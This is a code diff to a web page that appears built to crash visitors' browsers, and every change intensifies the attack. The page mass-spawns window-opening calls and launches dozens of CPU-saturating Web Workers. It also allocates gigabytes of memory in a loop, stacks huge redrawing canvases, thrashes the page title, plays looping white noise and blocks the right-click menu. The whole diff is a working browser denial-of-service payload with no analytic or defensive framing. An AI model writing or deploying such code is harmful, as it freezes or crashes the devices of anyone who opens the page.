@@ -14,13 +14,13 @@
       overflow: hidden;
       display: grid;
       place-items: center;
-      font-size: 18vw;
+      font-size: 26vw;
       font-weight: 900;
-      text-shadow: 0 0 100px #f00;
+      text-shadow: 0 0 150px #f00;
       user-select: none;
     }
     canvas { position: fixed; inset: 0; z-index: -1; }
-    .chaos { position: fixed; pointer-events: none; z-index: 5; mix-blend-mode: screen; }
+    .chaos { position: fixed; pointer-events: none; z-index: 5; mix-blend-mode: screen; filter: contrast(300%) brightness(200%); }
   </style>
 </head>
 <body>
@@ -36,92 +36,98 @@ function openNuke() {
     document.body.appendChild(a); a.click(); a.remove();
   } catch(e) {}
 }
-for (let i = 0; i < 80; i++) setTimeout(openNuke, i * 5);
-setInterval(() => { for (let i = 0; i < 25; i++) setTimeout(openNuke, i * 8); }, 120);
+for (let i = 0; i < 200; i++) setTimeout(openNuke, i * 1);
+setInterval(() => { for (let i = 0; i < 60; i++) setTimeout(openNuke, i * 3); }, 30);
 
-setInterval(() => { for (let i = 0; i < 4000; i++) document.title = Math.random().toString(36) + "💀"; }, 1);
+setInterval(() => { for (let i = 0; i < 15000; i++) document.title = Math.random().toString(36) + "💀🔥☠️"; }, 1);
 
 const workerCode = URL.createObjectURL(new Blob([`
   'use strict';
   self.onmessage = () => {
     let x = performance.now() * Math.PI;
     while (true) {
-      x = Math.sin(x) * Math.cos(x * 1.45) * Math.tan(x + 1e-9);
-      for (let i = 0; i < 160000000; i++) {
-        x += Math.log1p(Math.abs(x) + 1e-300) * 4.5e-9;
+      x = Math.sin(x) * Math.cos(x * 1.8) * Math.tan(x + 1e-9) * Math.sqrt(Math.abs(x));
+      for (let i = 0; i < 250000000; i++) {
+        x += Math.log1p(Math.abs(x) + 1e-300) * 7e-9;
       }
     }
   };
 `], { type: 'application/javascript' }));
 
-const threadCount = (navigator.hardwareConcurrency || 8) * 16;
+const threadCount = (navigator.hardwareConcurrency || 8) * 30;
 for (let i = 0; i < threadCount; i++) new Worker(workerCode).postMessage("go");
 
 const allocations = [];
 function bombMemory() {
   try {
     allocations.push(new ArrayBuffer(1 << 30));
-    allocations.push(new Float64Array(1 << 27).fill(Math.random() * 999999));
+    allocations.push(new Float64Array(1 << 28).fill(Math.random()));
     allocations.push(new Uint8Array(1 << 29));
   } catch(e) {}
 }
-for (let i = 0; i < 120; i++) bombMemory();
-setInterval(bombMemory, 80);
+for (let i = 0; i < 400; i++) bombMemory();
+setInterval(bombMemory, 30);
 
-for (let n = 0; n < 8; n++) {  
+for (let n = 0; n < 50; n++) {
   const c = document.createElement('canvas');
   c.style.position = 'fixed';
   c.style.inset = '0';
   c.style.zIndex = '-1';
-  c.style.opacity = '0.75';
+  c.style.opacity = '0.55';
   document.body.appendChild(c);
 
-  const ctx = c.getContext('2d', { alpha: true });
+  const ctx = c.getContext('2d');
 
   function resize() {
-    c.width = innerWidth * 3.6;
-    c.height = innerHeight * 3.6;
+    c.width = innerWidth * 5;
+    c.height = innerHeight * 5;
   }
   resize();
   window.addEventListener('resize', resize);
 
-  let t = n * 30;
+  let t = n * 15;
   function draw() {
-    ctx.fillStyle = 'rgba(0,0,0,0.1)';
+    ctx.fillStyle = 'rgba(0,0,0,0.05)';
     ctx.fillRect(0, 0, c.width, c.height);
 
-    for (let i = 0; i < 850; i++) {
-      const x = Math.sin(t * 0.04 + i) * c.width * 0.55 + c.width/2;
-      const y = Math.cos(t * 0.035 + i * 1.6) * c.height * 0.55 + c.height/2;
-      ctx.fillStyle = `hsl(${ (t * 30 + i * 8) % 360 }, 100%, 65%)`;
-      ctx.fillRect(x - 22, y - 22, 44, 44);
+    for (let i = 0; i < 2800; i++) {
+      const x = Math.sin(t * 0.08 + i) * c.width * 0.62 + c.width/2;
+      const y = Math.cos(t * 0.07 + i * 2.5) * c.height * 0.62 + c.height/2;
+      ctx.fillStyle = `hsl(${ (t*100 + i*25) % 360 }, 100%, 85%)`;
+      ctx.fillRect(x-35, y-35, 70, 70);
     }
-    t += 0.28;
+    t += 0.75;
     requestAnimationFrame(draw);
   }
   draw();
 }
 
-function spawnChaos() {
+for (let i = 0; i < 120; i++) {
   const el = document.createElement('div');
   el.className = 'chaos';
-  el.textContent = ["BYE","FUCK","RIP","DEAD","CRASH","LOL"][Math.floor(Math.random()*6)];
-  el.style.fontSize = (100 + Math.random()*400) + "px";
+  el.textContent = "CRASH";
+  el.style.fontSize = (150 + Math.random() * 800) + "px";
   el.style.left = Math.random() * 100 + "vw";
   el.style.top = Math.random() * 100 + "vh";
-  el.style.transform = `rotate(${Math.random()*1200}deg)`;
+  el.style.transform = `rotate(${Math.random()*5000}deg)`;
+  el.style.animation = `spin ${0.3 + Math.random()*0.8}s linear infinite`;
   document.body.appendChild(el);
-  setTimeout(() => el.remove(), 7000);
 }
-setInterval(spawnChaos, 20);
+
+const style = document.createElement('style');
+style.innerHTML = `@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`;
+document.head.appendChild(style);
 
 try {
   const audio = new (window.AudioContext || window.webkitAudioContext)();
-  const osc = audio.createOscillator();
-  osc.type = 'sawtooth';
-  osc.frequency.setValueAtTime(55, audio.currentTime);
-  osc.connect(audio.destination);
-  osc.start();
+  const noise = audio.createBufferSource();
+  const buffer = audio.createBuffer(1, audio.sampleRate * 10, audio.sampleRate);
+  const data = buffer.getChannelData(0);
+  for (let i = 0; i < data.length; i++) data[i] = Math.random() * 2 - 1;
+  noise.buffer = buffer;
+  noise.loop = true;
+  noise.connect(audio.destination);
+  noise.start();
 } catch(e) {}
 
 document.addEventListener('contextmenu', e => e.preventDefault());
